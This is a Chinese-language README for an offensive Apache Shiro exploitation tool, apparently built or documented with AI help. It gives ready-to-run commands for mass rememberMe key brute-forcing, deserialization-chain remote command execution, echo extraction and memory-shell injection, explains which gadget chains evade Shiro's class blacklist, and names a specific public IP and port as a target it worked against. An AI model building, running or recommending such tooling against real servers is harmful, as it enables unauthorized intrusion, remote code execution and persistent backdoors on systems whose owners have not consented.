# shiro-claude — 独立 Shiro 利用工具

基于 **Pyke-Shiro_0.3.jar** 引擎字节码重建的独立无头工具：爆破 key + 利用链 + 回显 + 内存马 一体化，可直接接入调用。

## 文件结构

```
shiro_pyke/
├── shiro-claude.jar     # ★ 独立可执行工具 (java -jar 直接跑, 含全部依赖)
├── shirokit.py          # ★ Python 驱动 (批量多进程, 结果 JSON 落盘)
├── ClaudeShiro.java     # 无头入口源码
├── src/                 # 反编译的 42 个核心类源码 (CFR 0.152, 可参考/增强)
├── classes/             # 从 Pyke jar 提取的原始 class 字节码
└── build/               # 编译产物
```

## 用法

```bash
# 单目标: 爆破 + 自动 RCE 验证 (一条命令)
python shirokit.py scan http://目标:端口/

# 批量: 目标文件 (每行 host:port), 并发多目标
python shirokit.py scan targets.txt rememberMe 20 5
#   → 命中 key 自动 rce 验证, 结果写入 shirokit_results.json

# 指定命令执行
python shirokit.py exec <url> <key> CommonsBeanutils1_183 AllEcho "id"

# 注入内存马
python shirokit.py memshell <url> <key> <echo> <path>

# 其他
python shirokit.py rce <url> <key>      # 自动遍历链+回显
python shirokit.py chains / echoes / keys / gcm
```

## 核心能力

| 命令 | 功能 | 说明 |
|------|------|------|
| `scan` | Shiro 检测 + 全量爆破 | 内置 **1106 个合法 key** (SPC 爆破, 无假阳性) |
| `rce` | 自动链+回显探测 | **15 链 × 3 回显**遍历, 首个能回显即输出 |
| `exec` | 指定命令执行 | AllEcho 回显 `BrY3jhHrh6<base64>yQqlMgS1cL` |
| `memshell` | 注入内存马 | 基于 InjectMemTool, 一次打点持久访问 |
| `gcm` | AES-GCM 开关 | 默认 CBC, 新版本 Shiro 用 GCM |

**全部 15 条链**（原版 Pyke 全量，含 SUID 变体）:
`CommonsBeanutils1_183`(主力) / `CommonsBeanutils1` / `CommonsBeanutilsAttrCompare_183` / `CommonsBeanutilsAttrCompare` / `CommonsBeanutilsObjectToStringComparator_183` / `CommonsBeanutilsObjectToStringComparator` / `CommonsBeanutilsString_183` / `CommonsBeanutilsString` / `CommonsBeanutilsPropertySource_183` / `CommonsBeanutilsPropertySource` / `CommonsCollections3` / `CommonsCollectionsK1` / `CommonsCollectionsK2` / `CommonsCollections2` / `CommonsBeanutilsString_192s`

回显: `AllEcho`(线程栈DFS通用) / SpringEcho / TomcatEcho

**SUID 变体说明**：`_183` 变体用 Javassist 强制注入 BeanComparator serialVersionUID = -3490850999041592962L（匹配 commons-beanutils 1.8.3 主流目标）；无后缀变体用默认 SUID（给非 1.8.3 目标）；`_192s` 匹配 1.9.2。主流目标（beanutils 1.8.3）用 `_183` 系。

**黑名单说明**：目标若 Shiro ≥1.4.2 有类黑名单，`CommonsCollections2/3/K2` 会被拦（payload 本地生成 OK 但目标反序列化失败），CB 系 + K1 抗性好——这就是 CB 系为主力的原因。

## 关键机制 (已验证)

- **CommonsBeanutils1_183 链**：BeanComparator(PriorityQueue) + TemplatesImpl(AllEcho 字节码)
- **回显**：命令放 `Authorizations: Basic base64(cmd)` header；AllEcho 类加载时从 `Thread.currentThread()` DFS 对象图找 HttpServletRequest；要求请求同时带 `Host` + `Authorizations` header
- **命中判定**：SPC(SimplePrincipalCollection) 反序列化成功 → deleteMe 数 < 基线 → key 正确

## 架构注意点

- **ShiroAttack 是静态状态**(headers/flagCount)，Java 内多线程会竞争污染
  → 爆破用**自建 HttpURLConnection** 绕开静态 headers；`buildPayload(key)` 线程安全可并发
  → **多目标用多进程**(Python ProcessPoolExecutor)，每进程一个目标
- **key 字典**：内置 1106 个合法 key（合并 Pyke 原字典 + ShiroCrack 补充，已剔除 8 个非法/脏 key；1106 全为 16/24/32 字节合法 AES key，爆破不会 InvalidKeyException）

## 关键教训 (为什么之前手动复刻 payload 失败)

工具 `Gadgets.createTemplatesImpl` 生成 TemplatesImpl 时**必须显式 `clazz.setSuperclass(AbstractTranslet)`**，
我之前手动复刻 (AllEcho 字节码→TemplatesImpl→CB1) 漏了这一步 → 目标反序列化后类加载失败 → deleteMe。
**目标 36.138.188.90:8081 没有 Shiro 1.4.2+ 类黑名单**，此前"黑名单拦截 TemplatesImpl"是误判，真正原因是 payload 构造缺 setSuperclass。
